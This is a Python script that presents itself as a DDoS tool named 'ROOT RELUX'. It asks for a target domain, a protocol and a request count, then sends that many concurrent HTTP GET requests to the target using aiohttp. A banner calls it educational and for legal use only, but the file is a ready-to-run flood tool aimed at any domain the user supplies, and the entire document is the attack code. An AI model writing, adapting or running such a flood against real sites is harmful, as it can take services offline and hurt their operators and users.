import pyfiglet
import aiohttp
import asyncio
from colorama import Fore, Style, init


# Initialize Colorama
init(autoreset=True)

def print_attractive_text():
    title_font = pyfiglet.Figlet(font='slant')
    subtitle_font = pyfiglet.Figlet(font='small')

    title = "ROOT RELUX"
    subtitle = "Made by JUNAYAD AHSAN"
    description = "DDOS Attack Alpha"

    print(Fore.CYAN + title_font.renderText(title))
    print(Fore.YELLOW + subtitle_font.renderText(subtitle))
    print(Fore.GREEN + f"This code is made for {Style.BRIGHT}educational purposes.")
    print(Fore.MAGENTA + f"By this code, people can learn about {Style.BRIGHT}{description}.")
    print(Fore.RED + f"Use this tool for {Style.BRIGHT}legal purposes.")

async def send_request(session, domain, protocol):
    url = f"{protocol}://{domain}"
    try:
        async with session.get(url, timeout=3) as response:
            if response.status == 200:
                print(Fore.GREEN + f"Request sent to {url}")
            else:
                print(Fore.YELLOW + f"Request failed with status code: {response.status}")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}")

async def run_attack(n, domain, protocol):
    async with aiohttp.ClientSession() as session:
      tasks = [send_request(session, domain, protocol) for _ in range(n)] 
      await asyncio.gather(*tasks)
if __name__ == "__main__":
    print_attractive_text()

    try:
        n = int(input("How many times do you want to send requests?: "))
        if n <= 0:
            raise ValueError("Number of requests must be a positive integer.")
    except ValueError as e:
        print(Fore.RED + f"Invalid input: {e}")
        exit(1)

    domain = input('Input your target domain (e.g., example.com): ').strip()
    if not domain:
        print(Fore.RED + "Domain cannot be empty.")
        exit(1)

    protocol = input('Choose protocol (http or https): ').strip().lower()
    if protocol not in ["http", "https"]:
        print(Fore.RED + "Invalid protocol! Defaulting to HTTP.")
        protocol = "http"

    asyncio.run(run_attack(n, domain, protocol))